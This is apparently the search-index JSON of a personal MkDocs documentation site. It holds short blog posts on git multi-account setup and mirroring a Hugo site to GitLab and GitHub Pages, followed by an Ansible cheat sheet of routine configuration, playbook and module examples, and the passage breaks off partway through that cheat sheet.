{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to uPCREiD Documentation","text":""},{"location":"#about","title":"\ud83d\ude80 About","text":"<p>Welcome to my personal documentation! Here you'll find a collection of guides, cheat sheets, and technical resources to streamline your development workflow.</p> <p>Regularly updated documentation \u2022 Built with MkDocs Material</p>"},{"location":"blog/","title":"Overview","text":"<p>Blog articles and publications.</p>"},{"location":"blog/2019/05/09/git-two-accounts-alias/","title":"Git two accounts alias","text":"<p>Hello,</p> <p>Recently, I was faced with a problem. How to manage two git accounts on the same computer? I explain myself, a \"<code>personal</code>\" account and a \"<code>work</code>\" account, on the same computer. Yes, I know that working on personal things with work materials is a bad habit ... but that's another question.</p> <p>So, to get rid of just that (I did not invent anything, there are a lot of tutorials on the web), you will need to create a separate directory. One for work, one for the person.</p> <p>Regarding git, you will have to manage your  $ HOME .gitconfig like this:</p> <pre><code>[includeIf \"gitdir:~/perso/\"]\n    path = ~/perso/.gitconfig\n\n[includeIf \"gitdir:~/work/\"]\n    path = ~/work/.gitconfig\n\n[user]\n</code></pre> <p>So as you see, [user] is not define. So you'll have to define it in another <code>.gitconfig</code>. So in each directory, create a <code>.gitconfig</code></p> <p>in the <code>/perso</code> directory:</p> <pre><code>[user]\n   email = perso@perso.com\n   name = name\n</code></pre> <p>in the <code>/work</code> directory:</p> <pre><code>[user]\n   email = work@work.com\n   name = name\n</code></pre> <p>And that's it. Each time you'll go into the folder, your \"<code>git user</code>\" will change.</p>"},{"location":"blog/2019/05/09/git-two-accounts-alias/#bonus","title":"Bonus","text":"<p>Here is my git alias for log:</p> <p>yes there is 3, 3 differents view.</p> <pre><code>[alias]\n    lg1 = log --pretty=format:\"%C(yellow)%h%Cred%d\\\\ %Creset%s%Cblue\\\\ [%cn]\" --decorate\n    lg2 = log --pretty=format:\"%C(yellow)%h%Cred%d\\\\ %Creset%s%Cblue\\\\ [%cn]\" --decorate --numstat\n    l = log --graph --pretty=tformat:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%an %cr)%Creset' --abbrev-commit --date=relative\n</code></pre> <p>See you !</p>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/","title":"\ud83d\udea7 Gitlab and Github pages handling the same code \ud83e\udd13","text":"<p>Hello,</p> <p>A small trick to have your static website hosted on github + gitlab, with the same source code.</p> <p>Why ? If one fall of course ! :D And also because it's fun, at least i think it's fun :)</p>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#gitlab-master","title":"Gitlab - Master","text":"<ul> <li>create our static website repo</li> <li>add web stuff inside the repo</li> <li>configure CI</li> </ul>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#create-our-static-website-repo","title":"create our static website repo","text":"<p>let's pretend our repo name is <code>upcreid.gitlab.io</code> and it's a hugo static website. Let's create it and make it public</p> <p></p> <p>then the usual stuff:</p> <pre><code>git clone git@gitlab.com:upcreid/upcreid.gitlab.io.git\ncd upcreid.gitlab.io\ntouch README.md\ngit add README.md\ngit commit -m \"add README\"\ngit push -u origin master\n</code></pre>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#create-gh-pages-branch","title":"create gh-pages branch","text":"<p>before going further we'll need to create a gh-pages branch on gitlab side, this in order to not break the CI when pushing without a gh-pages branch.</p> <p>Go then !</p> <pre><code>git checkout --orphan gh-pages\ngit rm --cached -r .\ngit commit -m \"new gh-pages branch\" --allow-empty\ngit push origin gh-pages\n</code></pre> <p>go back to master</p> <pre><code>git checkout master\n</code></pre>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#add-web-stuff-inside-the-repo","title":"add web stuff inside the repo","text":"<p>Ok, now let's add some code inside to have some static shit in there.</p> <ul> <li>Install hugo</li> <li>Create new site</li> </ul> <pre><code>hugo new site --force .\n</code></pre> <ul> <li>Install a theme</li> </ul> <pre><code>git submodule add https://github.com/theNewDynamic/gohugo-theme-ananke.git themes/ananke\n</code></pre> <ul> <li>add the theme, name and remove baseURL to the conf file</li> </ul> <pre><code>echo $'languageCode = \\\"en-us\\\"\\ntitle = \\\"upcreid.gitlab.io\\\"\\ntheme = \\\"ananke\\\"' &gt; config.toml\n</code></pre> <ul> <li>Start the server to verify if everythin goes ok</li> </ul> <pre><code>hugo server\n</code></pre> <ul> <li>Commit</li> </ul> <pre><code>git add .\ngit commit -m \"add basic hugo\"\ngit push\n</code></pre>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#configure-ci","title":"configure CI","text":"<p>Complicated !</p> <p>Just add one more file to the repo...</p> <p>.gitlab-ci.yml</p> <pre><code>image: registry.gitlab.com/pages/hugo:latest\n\nvariables:\n  GIT_SUBMODULE_STRATEGY: recursive\n\npages:\n  script:\n  - hugo -b \"https://upcreid.gitlab.io\"\n  artifacts:\n    paths:\n    - public\n  only:\n  - master\n</code></pre> <ul> <li>Commit</li> </ul> <pre><code>git add .\ngit commit -m \"add basic hugo\"\ngit push\n</code></pre> <p>and voila =&gt; https://upcreid.gitlab.io</p> <p>Now, let's handle github.</p>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#github-mirror","title":"Github - Mirror","text":"<ul> <li>create our static website repo</li> <li>branch configuration</li> <li>git mirror</li> <li>configure CI</li> </ul>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#create-our-static-website-repo_1","title":"create our static website repo","text":""},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#branch-configuration","title":"Branch configuration","text":"<p>After creation, create a branch called master. To be in phase with gitlab</p> <pre><code>echo \"# upcreid.github.io\" &gt;&gt; README.md\ngit init\ngit add README.md\ngit commit -m \"first commit\"\ngit branch -M master\ngit remote add origin git@github.com:upcreid/upcreid.github.io.git\ngit push -u origin master\n</code></pre>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#git-mirror","title":"Git mirror","text":"<p>Main part of this is to trigger the mirroring on gitlab side. So inside gitlab repo, simply launch</p> <pre><code>git remote add --mirror=push github git@github.com:upcreid/upcreid.github.io.git\n</code></pre> <p>So, we add a remote, and say it's a mirror (--mirror) and we name it github.</p> <p>Verify</p> <pre><code>git remote -v\n</code></pre> <p>you should have something like:</p> <pre><code>github  git@github.com:upcreid/upcreid.github.io.git (fetch)\ngithub  git@github.com:upcreid/upcreid.github.io.git (push)\norigin  git@gitlab.com:upcreid/upcreid.gitlab.io.git (fetch)\norigin  git@gitlab.com:upcreid/upcreid.gitlab.io.git (push)\n</code></pre>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#configure-ci_1","title":"configure CI","text":"<p>Then create the github CI file, we'll use the github actions. But we should commit those github action inside the gitlab repo.</p> <p>So inside the gitlab repo aka master, create the following dir/file:</p> <pre><code>mkdir .github/workflows\n</code></pre> <pre><code>touch .github/workflows/gh-pages.yml\n</code></pre> <p>And inside the gh-pages.yml</p> <pre><code>name: github pages\n\non:\n  push:\n    branches:\n      - master\n\njobs:\n  deploy:\n    runs-on: ubuntu-18.04\n    steps:\n      - uses: actions/checkout@v2\n        with:\n          submodules: true  # Fetch Hugo themes (true OR recursive)\n          fetch-depth: 0    # Fetch all history for .GitInfo and .Lastmod\n\n      - name: Setup Hugo\n        uses: peaceiris/actions-hugo@v2\n        with:\n          hugo-version: '0.81.0'\n\n      - name: Build\n        run: hugo -b \"https://upcreid.github.io\"\n\n      - name: Deploy\n        uses: peaceiris/actions-gh-pages@v3\n        with:\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n          publish_dir: ./public\n</code></pre> <p>And commit</p> <pre><code>git add .\ngit commit -m \"add github CI\"\ngit push origin &amp;&amp; git push github\n</code></pre> <p>As you can see, last command is in fact 2 commands. in order to push on gitlab + github. Some tricks can be made here to push with one command =&gt; google</p> <p>And that's it =&gt; https://upcreid.github.io/</p>"},{"location":"blog/2021/04/11/-gitlab-and-github-pages-handling-the-same-code-/#conclusion","title":"Conclusion","text":"<p>Since you got 2 remote you'll need to push to those remote after commiting.</p> <p>you can do that simply with</p> <pre><code>git push origin &amp;&amp; git push github\n</code></pre> <p>Then, nothing more should be done and both CI will be triggered.</p> <p>See you !</p>"},{"location":"blog/2021/07/08/rust-app-in-terminal-/","title":"Rust app in terminal \ud83d\udda5\ufe0f","text":"<p>Rust is awesome.</p> <p>Recently i found some great application for the terminal.</p>"},{"location":"blog/2021/07/08/rust-app-in-terminal-/#fd","title":"<code>fd</code>","text":"<p>find alternative</p>"},{"location":"blog/2021/07/08/rust-app-in-terminal-/#exa","title":"<code>exa</code>","text":"<p>ls alternative</p>"},{"location":"blog/2021/07/08/rust-app-in-terminal-/#dust","title":"<code>dust</code>","text":"<p>bored of du ?</p>"},{"location":"blog/2021/07/08/rust-app-in-terminal-/#alacritty","title":"<code>alacritty</code>","text":"<p>quickTerm</p>"},{"location":"blog/2021/07/08/rust-app-in-terminal-/#spotify-tui","title":"<code>spotify-tui</code>","text":"<p>Spotify in the terminal</p>"},{"location":"blog/2021/04/08/themove-/","title":"TheMove \ud83d\udef4","text":"<p>I've quit Paris recently, to a more little City.</p> <p>Because of the Covid stuff, but mainly to be closer to the nature.</p> <p>It was in my mind since a long time, and the actual crisis, and my work, give me the opportunity to move away.</p> <p>Remote Work is kind of OK.</p> <p>I'm missing the office, and mainly the people, but since i'm not alone at home, it's easier to handle.</p> <p>I was kind of afraid at the beginning, but i think i found my rhythm.</p>"},{"location":"cheat-sheet/","title":"Overview","text":"<p>Collection of quick reference guides for various tools and technologies.</p>"},{"location":"cheat-sheet/ansible/ansible/","title":"Ansible - Complete Guide","text":"<p>Ansible is an open-source IT automation tool that allows you to manage configuration, deploy applications, and orchestrate tasks across multiple servers.</p>"},{"location":"cheat-sheet/ansible/ansible/#installation","title":"Installation","text":""},{"location":"cheat-sheet/ansible/ansible/#linux-ubuntudebian","title":"Linux (Ubuntu/Debian)","text":"<pre><code># Via APT\nsudo apt update\nsudo apt install software-properties-common\nsudo add-apt-repository --yes --update ppa:ansible/ansible\nsudo apt install ansible\n\n# Via pip\npython3 -m pip install --user ansible\n\n# Check installation\nansible --version\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#macos","title":"macOS","text":"<pre><code># Via Homebrew\nbrew install ansible\n\n# Via pip\npython3 -m pip install --user ansible\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#centosrhel","title":"CentOS/RHEL","text":"<pre><code># Via DNF/YUM\nsudo dnf install ansible\n# or\nsudo yum install ansible\n\n# Via pip\npython3 -m pip install --user ansible\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#initial-configuration","title":"Initial Configuration","text":""},{"location":"cheat-sheet/ansible/ansible/#configuration-file","title":"Configuration File","text":"<pre><code># Global configuration\n/etc/ansible/ansible.cfg\n\n# User configuration\n~/.ansible.cfg\n\n# Project configuration\n./ansible.cfg\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#basic-ansiblecfg","title":"Basic ansible.cfg","text":"<pre><code>[defaults]\ninventory = ./inventory\nremote_user = admin\nhost_key_checking = False\nretry_files_enabled = False\ngathering = smart\nfact_caching = jsonfile\nfact_caching_connection = /tmp/ansible_facts\nfact_caching_timeout = 3600\n\n[privilege_escalation]\nbecome = True\nbecome_method = sudo\nbecome_user = root\nbecome_ask_pass = False\n\n[ssh_connection]\npipelining = True\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#inventory","title":"Inventory","text":"<pre><code># inventory/production\n[webservers]\nweb01.example.com\nweb02.example.com ansible_host=192.168.1.10\n\n[dbservers]\ndb01.example.com ansible_port=2222\ndb02.example.com\n\n[production:children]\nwebservers\ndbservers\n\n[production:vars]\nansible_user=admin\nansible_become=yes\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ad-hoc-commands","title":"Ad-Hoc Commands","text":""},{"location":"cheat-sheet/ansible/ansible/#basic-syntax","title":"Basic Syntax","text":"<pre><code>ansible [pattern] -m [module] -a \"[module options]\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#practical-examples","title":"Practical Examples","text":"<pre><code># Ping all servers\nansible all -m ping\n\n# Check uptime\nansible all -m command -a \"uptime\"\nansible all -a \"uptime\"  # command is the default module\n\n# Copy a file\nansible webservers -m copy -a \"src=/tmp/file dest=/tmp/file\"\n\n# Install a package\nansible webservers -m apt -a \"name=nginx state=present\" -b\nansible dbservers -m dnf -a \"name=postgresql state=latest\" -b\n\n# Restart a service\nansible webservers -m service -a \"name=nginx state=restarted\" -b\n\n# Create a user\nansible all -m user -a \"name=john state=present\" -b\n\n# Get facts\nansible all -m setup\nansible all -m setup -a \"filter=ansible_distribution*\"\n\n# Execute in parallel (10 servers at a time)\nansible webservers -a \"/sbin/reboot\" -f 10 -b\n\n# Use a specific inventory\nansible all -i inventory/staging -m ping\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#playbooks","title":"Playbooks","text":""},{"location":"cheat-sheet/ansible/ansible/#basic-structure","title":"Basic Structure","text":"<pre><code>---\n- name: Configure web servers\n  hosts: webservers\n  become: yes\n  vars:\n    http_port: 80\n    max_clients: 200\n\n  tasks:\n    - name: Install Nginx\n      ansible.builtin.apt:\n        name: nginx\n        state: present\n        update_cache: yes\n\n    - name: Start Nginx\n      ansible.builtin.service:\n        name: nginx\n        state: started\n        enabled: yes\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#complete-playbook-with-variables-and-handlers","title":"Complete Playbook with Variables and Handlers","text":"<pre><code>---\n- name: Deploy web application\n  hosts: webservers\n  become: yes\n\n  vars:\n    app_name: myapp\n    app_port: 8080\n\n  vars_files:\n    - vars/common.yml\n    - vars/secrets.yml  # Encrypted with Ansible Vault\n\n  tasks:\n    - name: Install dependencies\n      ansible.builtin.apt:\n        name:\n          - nginx\n          - python3\n          - python3-pip\n        state: present\n        update_cache: yes\n\n    - name: Create application directory\n      ansible.builtin.file:\n        path: \"/opt/{{ app_name }}\"\n        state: directory\n        owner: www-data\n        group: www-data\n        mode: '0755'\n\n    - name: Deploy Nginx configuration\n      ansible.builtin.template:\n        src: templates/nginx.conf.j2\n        dest: /etc/nginx/sites-available/{{ app_name }}\n        owner: root\n        group: root\n        mode: '0644'\n      notify: Reload Nginx\n\n    - name: Enable site\n      ansible.builtin.file:\n        src: /etc/nginx/sites-available/{{ app_name }}\n        dest: /etc/nginx/sites-enabled/{{ app_name }}\n        state: link\n      notify: Reload Nginx\n\n  handlers:\n    - name: Reload Nginx\n      ansible.builtin.service:\n        name: nginx\n        state: reloaded\n\n    - name: Restart Nginx\n      ansible.builtin.service:\n        name: nginx\n        state: restarted\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#executing-playbooks","title":"Executing Playbooks","text":"<pre><code># Execute a playbook\nansible-playbook site.yml\n\n# Dry-run mode (simulation)\nansible-playbook site.yml --check\n\n# Show differences\nansible-playbook site.yml --check --diff\n\n# Limit to specific hosts\nansible-playbook site.yml --limit web01.example.com\nansible-playbook site.yml --limit webservers\n\n# Use tags\nansible-playbook site.yml --tags configuration\nansible-playbook site.yml --skip-tags packages\n\n# Verbose mode\nansible-playbook site.yml -v    # Verbose\nansible-playbook site.yml -vv   # More verbose\nansible-playbook site.yml -vvv  # Very verbose\n\n# With additional variables\nansible-playbook site.yml -e \"version=1.2.3\"\nansible-playbook site.yml -e \"@vars/extra.yml\"\n\n# Ask for sudo password\nansible-playbook site.yml --ask-become-pass\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#roles","title":"Roles","text":""},{"location":"cheat-sheet/ansible/ansible/#role-structure","title":"Role Structure","text":"<pre><code>roles/\n  webserver/\n    tasks/\n      main.yml      # Main tasks\n    handlers/\n      main.yml      # Handlers\n    templates/\n      nginx.conf.j2\n    files/\n      index.html\n    vars/\n      main.yml      # Variables (high priority)\n    defaults/\n      main.yml      # Default variables (low priority)\n    meta/\n      main.yml      # Dependencies and metadata\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#role-example-tasksmainyml","title":"Role Example - tasks/main.yml","text":"<pre><code>---\n# roles/webserver/tasks/main.yml\n- name: Install Nginx\n  ansible.builtin.apt:\n    name: nginx\n    state: present\n    update_cache: yes\n\n- name: Copy configuration\n  ansible.builtin.template:\n    src: nginx.conf.j2\n    dest: /etc/nginx/nginx.conf\n    owner: root\n    group: root\n    mode: '0644'\n  notify: Reload Nginx\n\n- name: Deploy website\n  ansible.builtin.copy:\n    src: index.html\n    dest: /var/www/html/index.html\n    owner: www-data\n    group: www-data\n    mode: '0644'\n\n- name: Ensure Nginx is started\n  ansible.builtin.service:\n    name: nginx\n    state: started\n    enabled: yes\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#using-roles","title":"Using Roles","text":"<pre><code>---\n- name: Configure servers\n  hosts: all\n  become: yes\n\n  roles:\n    - common\n    - webserver\n    - monitoring\n\n- name: Configuration with variables\n  hosts: webservers\n  become: yes\n\n  roles:\n    - role: nginx\n      vars:\n        nginx_port: 8080\n        nginx_user: www-data\n\n- name: Dynamic inclusion\n  hosts: all\n  tasks:\n    - name: Include role conditionally\n      include_role:\n        name: apache\n      when: ansible_facts['os_family'] == \"Debian\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#role-dependencies-metamainyml","title":"Role Dependencies - meta/main.yml","text":"<pre><code>---\n# roles/webserver/meta/main.yml\ndependencies:\n  - role: common\n  - role: firewall\n    vars:\n      firewall_allowed_ports:\n        - 80\n        - 443\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#variables","title":"Variables","text":""},{"location":"cheat-sheet/ansible/ansible/#defining-variables","title":"Defining Variables","text":"<pre><code># In a playbook\nvars:\n  http_port: 80\n  server_name: web01\n\n# From a file\nvars_files:\n  - vars/common.yml\n  - vars/{{ ansible_facts['distribution'] }}.yml\n\n# From command line\nansible-playbook site.yml -e \"version=1.2.3\"\nansible-playbook site.yml -e \"@vars/extra.yml\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#variable-types","title":"Variable Types","text":"<pre><code># Simple\napp_name: myapp\n\n# List\npackages:\n  - nginx\n  - php\n  - mysql-server\n\n# Dictionary\nuser:\n  name: john\n  uid: 1000\n  shell: /bin/bash\n  groups:\n    - sudo\n    - docker\n\n# Usage\n- name: Install packages\n  apt:\n    name: \"{{ packages }}\"\n    state: present\n\n- name: Create user\n  user:\n    name: \"{{ user.name }}\"\n    uid: \"{{ user.uid }}\"\n    shell: \"{{ user.shell }}\"\n    groups: \"{{ user.groups }}\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#group_vars-and-host_vars","title":"group_vars and host_vars","text":"<pre><code># Structure\ninventory/\n  production\ngroup_vars/\n  all.yml\n  webservers.yml\n  dbservers.yml\nhost_vars/\n  web01.example.com.yml\n  db01.example.com.yml\n</code></pre> <pre><code># group_vars/webservers.yml\n---\nhttp_port: 80\nmax_clients: 200\nenable_ssl: true\n\n# host_vars/web01.example.com.yml\n---\nserver_id: 1\nlocal_ip: 192.168.1.10\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ansible-facts","title":"Ansible Facts","text":"<pre><code># Using facts\n- name: Display operating system\n  debug:\n    msg: \"OS: {{ ansible_facts['distribution'] }} {{ ansible_facts['distribution_version'] }}\"\n\n# Commonly used facts\nansible_facts['hostname']\nansible_facts['fqdn']\nansible_facts['default_ipv4']['address']\nansible_facts['os_family']  # Debian, RedHat, etc.\nansible_facts['distribution']  # Ubuntu, CentOS, etc.\nansible_facts['distribution_major_version']\nansible_facts['processor_cores']\nansible_facts['memtotal_mb']\nansible_facts['mounts']\n\n# Disable fact gathering\n- hosts: all\n  gather_facts: no\n\n# Gather manually\n- name: Gather facts\n  setup:\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#registered-variables","title":"Registered Variables","text":"<pre><code>- name: Check if file exists\n  stat:\n    path: /etc/myapp/config.conf\n  register: config_file\n\n- name: Create file if it doesn't exist\n  file:\n    path: /etc/myapp/config.conf\n    state: touch\n  when: not config_file.stat.exists\n\n- name: Execute a command\n  command: /usr/bin/mycommand\n  register: result\n\n- name: Display result\n  debug:\n    var: result.stdout_lines\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#jinja2-templates","title":"Jinja2 Templates","text":""},{"location":"cheat-sheet/ansible/ansible/#basic-template","title":"Basic Template","text":"<pre><code>{# templates/nginx.conf.j2 #}\n# Nginx configuration for {{ ansible_facts['hostname'] }}\nuser {{ nginx_user }};\nworker_processes {{ ansible_facts['processor_cores'] }};\n\nevents {\n    worker_connections {{ worker_connections | default(1024) }};\n}\n\nhttp {\n    server {\n        listen {{ http_port }};\n        server_name {{ server_name }};\n\n        {% if enable_ssl %}\n        listen 443 ssl;\n        ssl_certificate {{ ssl_cert_path }};\n        ssl_certificate_key {{ ssl_key_path }};\n        {% endif %}\n\n        location / {\n            root /var/www/html;\n            index index.html;\n        }\n    }\n\n    {% for backend in backend_servers %}\n    upstream {{ backend.name }} {\n        server {{ backend.host }}:{{ backend.port }};\n    }\n    {% endfor %}\n}\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#common-jinja2-filters","title":"Common Jinja2 Filters","text":"<pre><code># String manipulation\n{{ 'hello' | upper }}  # HELLO\n{{ 'HELLO' | lower }}  # hello\n{{ path | basename }}  # Filename\n{{ path | dirname }}   # Directory\n\n# Default values\n{{ variable | default('default_value') }}\n{{ variable | default(omit) }}  # Omit if not defined\n\n# List operations\n{{ [1,2,3,4,5] | max }}  # 5\n{{ [1,2,3,4,5] | min }}  # 1\n{{ list | unique }}     # Deduplicate\n{{ list | sort }}       # Sort\n{{ list | length }}     # Length\n\n# Type conversions\n{{ '42' | int }}        # Integer\n{{ 42 | string }}       # String\n{{ 'yes' | bool }}      # Boolean\n\n# Hashing and encoding\n{{ 'password' | hash('sha256') }}\n{{ 'text' | b64encode }}\n{{ encoded | b64decode }}\n\n# Dictionary manipulation\n{{ dict | dict2items }}\n{{ list | items2dict }}\n\n# Random\n{{ ['a', 'b', 'c'] | random }}\n{{ 100 | random }}  # Between 0 and 100\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#conditionals-and-loops","title":"Conditionals and Loops","text":"<pre><code>{% if ansible_facts['os_family'] == \"Debian\" %}\n  # Debian configuration\n{% elif ansible_facts['os_family'] == \"RedHat\" %}\n  # RedHat configuration\n{% else %}\n  # Default configuration\n{% endif %}\n\n{% for user in users %}\nUser {{ user.name }} {\n    uid = {{ user.uid }}\n    shell = {{ user.shell }}\n}\n{% endfor %}\n\n{% for key, value in dict.items() %}\n{{ key }} = {{ value }}\n{% endfor %}\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#handlers","title":"Handlers","text":""},{"location":"cheat-sheet/ansible/ansible/#definition-and-usage","title":"Definition and Usage","text":"<pre><code># In a playbook\nhandlers:\n  - name: Reload Nginx\n    service:\n      name: nginx\n      state: reloaded\n\n  - name: Restart Nginx\n    service:\n      name: nginx\n      state: restarted\n\ntasks:\n  - name: Copy configuration\n    copy:\n      src: nginx.conf\n      dest: /etc/nginx/nginx.conf\n    notify:\n      - Reload Nginx\n\n  - name: Update SSL certificate\n    copy:\n      src: cert.pem\n      dest: /etc/ssl/cert.pem\n    notify:\n      - Restart Nginx\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#force-immediate-execution","title":"Force Immediate Execution","text":"<pre><code>- name: Update configuration\n  template:\n    src: config.j2\n    dest: /etc/app/config.conf\n  notify: Restart app\n\n- name: Force handler execution\n  meta: flush_handlers\n\n- name: This task runs after handler\n  debug:\n    msg: \"Handler executed\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#grouping-with-listen","title":"Grouping with Listen","text":"<pre><code>handlers:\n  - name: Restart web services\n    service:\n      name: \"{{ item }}\"\n      state: restarted\n    loop:\n      - nginx\n      - php-fpm\n    listen: \"restart web stack\"\n\ntasks:\n  - name: Update configuration\n    template:\n      src: config.j2\n      dest: /etc/config.conf\n    notify: restart web stack\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#conditionals","title":"Conditionals","text":""},{"location":"cheat-sheet/ansible/ansible/#basic-conditions","title":"Basic Conditions","text":"<pre><code>- name: Install Apache on Debian\n  apt:\n    name: apache2\n    state: present\n  when: ansible_facts['os_family'] == \"Debian\"\n\n- name: Install Apache on RedHat\n  dnf:\n    name: httpd\n    state: present\n  when: ansible_facts['os_family'] == \"RedHat\"\n\n- name: Multiple conditions (AND)\n  command: /bin/something\n  when:\n    - ansible_facts['distribution'] == \"Ubuntu\"\n    - ansible_facts['distribution_major_version'] == \"20\"\n\n- name: Multiple conditions (OR)\n  command: /bin/something\n  when: &gt;\n    ansible_facts['distribution'] == \"Ubuntu\" or\n    ansible_facts['distribution'] == \"Debian\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#variable-tests","title":"Variable Tests","text":"<pre><code>- name: Variable defined\n  debug:\n    msg: \"Variable exists\"\n  when: my_variable is defined\n\n- name: Variable not defined\n  debug:\n    msg: \"Variable doesn't exist\"\n  when: my_variable is not defined\n\n- name: Test if list is empty\n  debug:\n    msg: \"Empty list\"\n  when: my_list | length == 0\n\n- name: Test boolean\n  debug:\n    msg: \"Enabled\"\n  when: enable_feature | bool\n\n- name: Test command result\n  command: /usr/bin/test -f /tmp/file\n  register: result\n  ignore_errors: yes\n\n- name: Use result\n  debug:\n    msg: \"File exists\"\n  when: result.rc == 0\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#loops","title":"Loops","text":""},{"location":"cheat-sheet/ansible/ansible/#simple-loops","title":"Simple Loops","text":"<pre><code>- name: Create multiple users\n  user:\n    name: \"{{ item }}\"\n    state: present\n  loop:\n    - alice\n    - bob\n    - charlie\n\n- name: Install multiple packages\n  apt:\n    name: \"{{ item }}\"\n    state: present\n  loop:\n    - nginx\n    - php\n    - mysql-server\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#loops-with-dictionaries","title":"Loops with Dictionaries","text":"<pre><code>- name: Create users with details\n  user:\n    name: \"{{ item.name }}\"\n    uid: \"{{ item.uid }}\"\n    groups: \"{{ item.groups }}\"\n  loop:\n    - { name: 'alice', uid: 1001, groups: 'wheel' }\n    - { name: 'bob', uid: 1002, groups: 'users' }\n\n- name: Iterate over dictionary\n  debug:\n    msg: \"{{ item.key }} = {{ item.value }}\"\n  loop: \"{{ my_dict | dict2items }}\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#advanced-loops","title":"Advanced Loops","text":"<pre><code>- name: Loop with index\n  debug:\n    msg: \"Index {{ item.0 }}: {{ item.1 }}\"\n  loop: \"{{ list | zip(range(list|length)) | list }}\"\n\n- name: Nested loops\n  debug:\n    msg: \"{{ item.0 }} - {{ item.1 }}\"\n  loop: \"{{ list1 | product(list2) | list }}\"\n\n- name: Loop until condition\n  shell: /usr/bin/check_status\n  register: result\n  until: result.stdout.find(\"ready\") != -1\n  retries: 5\n  delay: 10\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#error-handling","title":"Error Handling","text":""},{"location":"cheat-sheet/ansible/ansible/#blocks-trycatch","title":"Blocks (Try/Catch)","text":"<pre><code>- block:\n    - name: Task that may fail\n      command: /bin/false\n\n    - name: This task won't run if previous fails\n      debug:\n        msg: \"Success\"\n  rescue:\n    - name: Handle error\n      debug:\n        msg: \"An error occurred\"\n\n    - name: Corrective actions\n      command: /bin/fix_problem\n  always:\n    - name: Always executed (cleanup)\n      debug:\n        msg: \"Cleanup\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ignoring-errors","title":"Ignoring Errors","text":"<pre><code>- name: This task may fail\n  command: /bin/might_fail\n  ignore_errors: yes\n\n- name: Change failure status\n  command: /usr/bin/check\n  register: result\n  failed_when: \"'FAILED' in result.stderr\"\n\n- name: Define when it's a change\n  command: /usr/bin/update\n  register: result\n  changed_when: \"'Updated' in result.stdout\"\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#essential-modules","title":"Essential Modules","text":""},{"location":"cheat-sheet/ansible/ansible/#file-management","title":"File Management","text":""},{"location":"cheat-sheet/ansible/ansible/#ansiblebuiltincopy","title":"ansible.builtin.copy","text":"<pre><code>- name: Copy a file\n  copy:\n    src: /source/file\n    dest: /dest/file\n    owner: root\n    group: root\n    mode: '0644'\n    backup: yes\n\n- name: Copy with inline content\n  copy:\n    content: |\n      Line 1\n      Line 2\n    dest: /etc/myfile.conf\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ansiblebuiltinfile","title":"ansible.builtin.file","text":"<pre><code>- name: Create directory\n  file:\n    path: /etc/myapp\n    state: directory\n    mode: '0755'\n\n- name: Create symbolic link\n  file:\n    src: /original/path\n    dest: /link/path\n    state: link\n\n- name: Delete file\n  file:\n    path: /tmp/file\n    state: absent\n\n- name: Change permissions\n  file:\n    path: /etc/myfile\n    mode: '0644'\n    owner: root\n    group: root\n</code></pre>"},{"location":"cheat-sheet/ansible/ansible/#ansiblebuiltinlineinfile","title":"ansible.builtin.lineinfile","text":"<pre><code>- name: Ensure line exists\n  lineinfile:\n    path: /etc/hosts\n    line: '192.168.1.100 server.example.com'\n    state: present\n\n- name: Replace line via regex\n  lineinfile:\n    path: /etc/selinux/config\n    regexp: '^SELINUX='\n    line: 'SELINUX=enforcing'\n\n- name: Add after pattern\n  lineinfile:\n    path: /etc/hosts\n    line: '192.168.1.100 myserver'\n    insertafter: '^127\\.0\\.0\\.1'\n\n- name: Remove 